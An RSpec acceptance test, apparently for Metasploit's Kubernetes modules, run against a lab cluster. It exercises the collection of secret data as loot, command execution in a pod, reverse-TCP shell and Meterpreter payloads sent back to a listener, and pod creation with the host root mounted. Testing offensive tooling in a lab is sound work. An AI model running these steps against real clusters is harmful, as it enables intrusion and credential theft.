require 'acceptance_spec_helper'
require 'base64'
require_relative '../../../test/module_targets/kubernetes/native'

RSpec.describe 'Genuine Kubernetes API and pod targets' do
  include_context 'module target'
  include_context 'wait_for_expect'

  profile = ENV.fetch('KUBERNETES_PROFILE', 'enumeration')
  raise ArgumentError, 'Unknown Kubernetes profile' unless %w[enumeration exec].include?(profile)

  before(:all) do
    @native_driver = KubernetesTarget.new(compose: target_runtime.fetch('compose'), endpoint: target_endpoint('cluster'))
    begin
      @native = @native_driver.prepare
      File.write(File.join(target_runtime.fetch('artifacts'), 'native-kubernetes.json'), JSON.pretty_generate(@native))
    ensure
      save_native_commands
    end
  end

  after do |example|
    if @native
      state = { pods: pod_names, files: @native_driver.pod_files }
      File.write(File.join(target_runtime.fetch('artifacts'), "post-example-#{example.id.gsub(/[^a-zA-Z0-9_-]/, '_')}.json"), JSON.pretty_generate(state))
      console_command('jobs -K')
      console_command('sessions -K')
      # Recovery follows the per-case assertions and preserved state.
      (state.fetch(:pods) - [KubernetesTarget::POD]).each do |name|
        @native_driver.kubectl('delete', 'pod', name, '-n', KubernetesTarget::NAMESPACE, '--wait=true', '--timeout=40s')
      end
      extra = state.fetch(:files) - @native.fetch(:pod_files)
      extra.each { |name| @native_driver.kubectl('exec', '-n', KubernetesTarget::NAMESPACE, KubernetesTarget::POD, '--', 'rm', '-f', "/tmp/#{name}") }
    end
    save_native_commands
  end

  if profile == 'enumeration'
    %w[table json].each do |format|
      it "reports the exact native server version twice as #{format}" do
        2.times do
          output = enumerate('version', { 'OUTPUT' => format })
          if format == 'json'
            expect(json_output(output)).to eq(@native.fetch(:version))
          else
            @native.fetch(:version).each_value { |value| expect(output).to include(value) }
          end
        end
      end
    end

    it 'reports the real limited-token authorization rules' do
      output = enumerate('auth', { 'OUTPUT' => 'json' }, token: 'limited')
      expect(KubernetesTarget.auth_projection(json_output(output).fetch('status'))).to eq(KubernetesTarget.auth_projection(@native.fetch(:auth).fetch('status')))
    end

    it 'lists actual namespaces as JSON' do
      output = enumerate('namespaces', { 'OUTPUT' => 'json' })
      expect(json_output(output).map { |item| item.dig('metadata', 'name') }.sort).to eq(@native.dig(:controls, :namespaces, 'items').map { |item| item.dig('metadata', 'name') }.sort)
    end

    it 'gets one named namespace through the singular action' do
      output = enumerate('namespace', { 'OUTPUT' => 'json', 'NAME' => KubernetesTarget::NAMESPACE })
      expect(json_output(output).map { |item| item.dig('metadata', 'name') }).to eq([KubernetesTarget::NAMESPACE])
    end

    it 'lists actual pod names, UIDs and images' do
      output = enumerate('pods', { 'OUTPUT' => 'json' })
      expect(KubernetesTarget.pod_projection(json_output(output))).to eq(KubernetesTarget.pod_projection(@native.dig(:controls, :pods, 'items')))
    end

    it 'gets one named pod through the singular action' do
      output = enumerate('pod', { 'OUTPUT' => 'json', 'NAME' => KubernetesTarget::POD })
      expect(KubernetesTarget.pod_projection(json_output(output))).to eq(KubernetesTarget.pod_projection(@native.dig(:controls, :pods, 'items')))
    end

    it 'collects exact native secret data and loot twice' do
      %w[json table].each do |format|
        2.times do
          before = loot_files
          output = enumerate('secrets', { 'OUTPUT' => format })
          if format == 'json'
            expect(KubernetesTarget.secret_projection(json_output(output))).to eq(KubernetesTarget.secret_projection(@native.dig(:controls, :secrets, 'items')))
          else
            expect(output).to include("Secrets (namespace: #{KubernetesTarget::NAMESPACE})")
            @native.dig(:controls, :secrets, 'items').each { |secret| expect(output).to include(secret.dig('metadata', 'name'), secret.fetch('type')) }
          end
          created = loot_files - before
          expected = KubernetesTarget.secret_bytes(@native.dig(:controls, :secrets, 'items'))
          expect(created.length).to eq(expected.length), output
          actual = created.map { |path| File.binread(path) }
          expected.each do |type, value|
            if type == 'service-token'
              match = actual.find { |bytes| bytes.start_with?('{') && JSON.parse(bytes).key?('token') }
              expect(match).not_to be_nil, output
              token_data = JSON.parse(match)
              expect(token_data).to eq(value)
            else
              expect(actual).to include(value)
            end
          end
          expect(output).to include('basic_auth basic-auth: moduleuser:public-module-password')
          expect(output).not_to include('Failed parsing secret')
        end
      end
    end

    it 'gets a named basic-auth secret through the singular action' do
      output = enumerate('secret', { 'OUTPUT' => 'json', 'NAME' => 'basic-auth' })
      expected = @native.dig(:controls, :secrets, 'items').select { |secret| secret.dig('metadata', 'name') == 'basic-auth' }
      expect(KubernetesTarget.secret_projection(json_output(output))).to eq(KubernetesTarget.secret_projection(expected))
      expect(output).to include('basic_auth basic-auth: moduleuser:public-module-password')
    end

    it 'uses the fallback namespace list with genuinely denied secret access' do
      before = loot_files
      output = enumerate('all', { 'NAMESPACE_LIST' => KubernetesTarget::NAMESPACE, 'OUTPUT' => 'table' }, token: 'limited', allow_errors: true)
      expect(output).to include('Unable to extract namespaces.', "Namespace 0: #{KubernetesTarget::NAMESPACE}", KubernetesTarget::POD, 'Kubernetes ForbiddenError')
      expect(output).not_to include('Failed parsing secret', 'basic_auth basic-auth')
      expect(loot_files).to eq(before)
    end

    %w[pods secrets].each do |action|
      it "reports a genuine empty #{action} list without loot" do
        before = loot_files
        expect(json_output(enumerate(action, { 'OUTPUT' => 'json', 'NAMESPACE' => KubernetesTarget::EMPTY_NAMESPACE }))).to eq([])
        expect(loot_files).to eq(before)
      end
    end

    [
      ['invalid token', 'invalid', {}, 401],
      ['forbidden pod access', 'blocked', {}, 403],
      ['missing pod', 'viewer', { 'NAME' => 'missing-pod' }, 404]
    ].each do |label, token, options, code|
      it "reports native #{label} without a successful resource list" do
        before = loot_files
        output = enumerate(options.empty? ? 'pods' : 'pod', { 'OUTPUT' => 'json' }.merge(options), token: token, allow_errors: true)
        expect(json_output(output).fetch('code')).to eq(code)
        expect(json_output(output).fetch('status')).to eq('Failure')
        expect(loot_files).to eq(before)
      end
    end
  else
    it 'executes a Unix command twice with fresh native file proof' do
      2.times do |iteration|
        before = @native_driver.pod_files
        proof = "/tmp/module-command-#{iteration}"
        job, offset = execute(1, 'cmd/unix/generic', 'CMD' => "printf command-#{iteration} > #{proof}; hostname")
        finish(job)
        expect(console.all_data.byteslice(offset..)).to include(KubernetesTarget::POD)
        expect(native_proof(proof).fetch('contents')).to eq("command-#{iteration}")
        remove_proof(proof)
        expect(@native_driver.pod_files).to eq(before)
        successful_output(offset)
      end
    end

    it 'opens and uses an interactive WebSocket shell twice' do
      2.times do
        before = @native_driver.pod_files
        job, offset = execute(0, 'cmd/unix/interact')
        opened = opened_session('shell')
        prove_session(opened, 'shell')
        console_command("sessions -k #{opened}")
        finish(job)
        expect(successful_output(offset)).to include('Successfully established the WebSocket')
        expect(@native_driver.pod_files).to eq(before)
      end
    end

    it 'delivers and removes a genuine Linux dropper twice' do
      2.times do
        before = @native_driver.pod_files
        job, offset = execute(2, 'linux/x64/shell_reverse_tcp', 'LPORT' => 4661, 'SRVHOST' => listener_host, 'SRVPORT' => 8081)
        opened = opened_session('shell')
        prove_session(opened, 'shell')
        console_command("sessions -k #{opened}")
        finish(job)
        successful_output(offset)
        expect(@native_driver.pod_files).to eq(before)
      end
    end

    it 'delivers Python Meterpreter twice and discovers and routes configuration through that real pod session' do
      2.times do |iteration|
        before = @native_driver.pod_files
        job, offset = execute(3, 'python/meterpreter/reverse_tcp', 'LPORT' => 4662)
        opened = opened_session('meterpreter')
        prove_session(opened, 'meterpreter')
        if iteration.zero?
          routed = enumerate('pods', { 'SESSION' => opened, 'RHOSTS' => '', 'RPORT' => '', 'TOKEN' => '', 'NAMESPACE' => '', 'OUTPUT' => 'json' }, allow_errors: true)
          expect(routed).to include("Routing traffic through session: #{opened}", 'Kubernetes service host:')
          routed_pods = json_output(routed)
          expect(routed_pods).to be_an(Array)
          expect(KubernetesTarget.pod_projection(routed_pods)).to eq(KubernetesTarget.pod_projection(@native.dig(:controls, :pods, 'items')))
          routed_job, routed_offset = execute(0, 'cmd/unix/interact', 'SESSION' => opened, 'RHOSTS' => '', 'RPORT' => '', 'TOKEN' => '', 'NAMESPACE' => '')
          routed_shell = opened_session('shell', exclude: [opened])
          prove_session(routed_shell, 'shell')
          console_command("sessions -k #{routed_shell}")
          finish(routed_job)
          successful_output(routed_offset)
        end
        console_command("sessions -k #{opened}")
        finish(job)
        successful_output(offset)
        expect(@native_driver.pod_files).to eq(before)
      end
    end

    [false, true].each do |explicit_image|
      it "creates a genuine pod using #{explicit_image ? 'PodImage' : 'discovered image'} and preserves documented operator cleanup" do
        before = pod_names
        options = { 'POD' => '', 'CMD' => 'hostname; cat /host_mnt/etc/os-release' }
        options['PodImage'] = KubernetesTarget::IMAGE if explicit_image
        job, offset = execute(1, 'cmd/unix/generic', options)
        finish(job)
        output = successful_output(offset)
        name = output[/Pod created: ([a-z0-9]+)/, 1]
        expect(name).not_to be_nil, output
        expect(pod_names - before).to eq([name])
        expect(output).to include(name, 'K3s v1.32.3+k3s1')
        pod = JSON.parse(@native_driver.kubectl('get', 'pod', name, '-n', KubernetesTarget::NAMESPACE, '-o', 'json'))
        expect(pod.dig('spec', 'volumes').any? { |volume| volume.dig('hostPath', 'path') == '/' }).to be(true)
        @native_driver.kubectl('delete', 'pod', name, '-n', KubernetesTarget::NAMESPACE, '--wait=true', '--timeout=40s')
        expect(pod_names).to eq(before)
      end
    end

    [
      ['invalid authentication', { 'TOKEN' => 'invalid-module-target-token' }, 'Insufficient Kubernetes access'],
      ['denied execution', { 'TOKEN_PROFILE' => 'blocked' }, 'Insufficient Kubernetes access'],
      ['missing pod', { 'POD' => 'missing-pod' }, 'The WebSocket connection failed'],
      ['empty image discovery', { 'POD' => '', 'NAMESPACE' => KubernetesTarget::EMPTY_NAMESPACE }, 'An image could not be found']
    ].each do |label, options, reason|
      it "refuses #{label} with unchanged native pod and file state" do
        before = pod_names
        files = @native_driver.pod_files
        job, offset = execute(1, 'cmd/unix/generic', { 'CMD' => 'true' }.merge(options))
        finish(job)
        output = console.all_data.byteslice(offset..)
        expect(output).to include(reason)
        expect(output).to match(/Exploit (?:aborted|failed)/)
        expect(output).not_to match(/Exception|undefined method|Error running command/)
        expect(pod_names).to eq(before)
        expect(@native_driver.pod_files).to eq(files)
      end
    end
  end

  def enumerate(action, options = {}, token: 'viewer', allow_errors: false)
    credential = token == 'invalid' ? 'invalid-module-target-token' : @native.fetch(:tokens).fetch(token)
    run_target_module('auxiliary/cloud/kubernetes/enum_kubernetes', 'cluster', { 'ACTION' => action, 'TOKEN' => credential, 'NAMESPACE' => KubernetesTarget::NAMESPACE, 'SSL' => true }.merge(options), allow_errors: allow_errors)
  end

  def execute(target, payload, options = {})
    options = options.dup
    token = @native.fetch(:tokens).fetch(options.delete('TOKEN_PROFILE') || 'executor')
    options = { 'LHOST' => listener_host, 'LPORT' => 4660 }.merge(options) if payload.include?('reverse_tcp')
    offset = console.all_data.bytesize
    output = run_target_module('exploit/multi/kubernetes/exec', 'cluster', {
      'TARGET' => target, 'PAYLOAD' => payload, 'TOKEN' => token, 'NAMESPACE' => KubernetesTarget::NAMESPACE,
      'POD' => KubernetesTarget::POD, 'SSL' => true, 'SHELL' => '/bin/sh'
    }.merge(options), action: 'run -j', allow_errors: true)
    job = output[/Exploit running as background job (\d+)/, 1]
    expect(job).not_to be_nil, output
    [job, offset]
  end

  def finish(identifier)
    wait_for_expect(120, 0.2) { expect(console_command('jobs -l').scan(/^\s*(\d+)\s/).flatten).not_to include(identifier) }
  end

  def successful_output(offset)
    output = console.all_data.byteslice(offset..)
    expect(output).not_to match(/Exploit (?:aborted|failed)|Exception|undefined method|Unknown datastore option/)
    output
  end

  def opened_session(kind, exclude: [])
    @used_session_ids ||= []
    opened = nil
    wait_for_expect(100, 0.2) do
      output = console_command('sessions -l')
      opened = output.scan(/^\s*(\d+)\s+.*\b#{kind}\b/i).flatten.find { |identifier| !(exclude + @used_session_ids).include?(identifier) }
      expect(opened).not_to be_nil, output
      label = kind == 'shell' ? 'Command shell' : 'Meterpreter'
      expect(console.all_data).to include("#{label} session #{opened} opened")
    end
    @used_session_ids << opened
    opened
  end

  def prove_session(identifier, kind)
    proof = '/tmp/module-session-proof'
    expect(@native_driver.pod_files).not_to include(File.basename(proof))
    flag = kind == 'meterpreter' ? '-C' : '-c'
    command = kind == 'meterpreter' ? "execute -f /bin/touch -a #{proof}" : "/bin/touch #{proof}"
    console_command("sessions -i #{identifier} #{flag} #{command.inspect}")
    wait_for_expect(20, 0.2) { expect(native_proof(proof).fetch('uid')).to eq(0) }
    identity = kind == 'meterpreter' ? 'sysinfo' : '/bin/hostname'
    expect(console_command("sessions -i #{identifier} #{flag} #{identity.inspect}")).to include(KubernetesTarget::POD)
    remove_proof(proof)
  end

  def native_proof(path)
    code = 'import json,sys,pathlib; p=pathlib.Path(sys.argv[1]); print(json.dumps(dict(uid=p.stat().st_uid,contents=p.read_text()) if p.is_file() else dict(uid=None,contents=None)))'
    JSON.parse(@native_driver.kubectl('exec', '-n', KubernetesTarget::NAMESPACE, KubernetesTarget::POD, '--', 'python3', '-c', code, path))
  end

  def remove_proof(path)
    @native_driver.kubectl('exec', '-n', KubernetesTarget::NAMESPACE, KubernetesTarget::POD, '--', 'rm', '-f', path)
  end

  def pod_names
    JSON.parse(@native_driver.kubectl('get', 'pods', '-n', KubernetesTarget::NAMESPACE, '-o', 'json')).fetch('items').map { |pod| pod.dig('metadata', 'name') }.sort
  end

  def json_output(output)
    document = output[/^(?:\[\]|\{\}|[\[{]\r?\n.*?^[\]}])\r?$/m]
    expect(document).not_to be_nil, output
    JSON.parse(document)
  end

  def loot_files
    Dir[File.join(ENV.fetch('MSF_CFGROOT_CONFIG'), 'loot', '*')]
  end

  def save_native_commands
    return unless @native_driver

    File.write(File.join(target_runtime.fetch('artifacts'), 'native-commands.json'), JSON.pretty_generate(@native_driver.commands))
  end
end
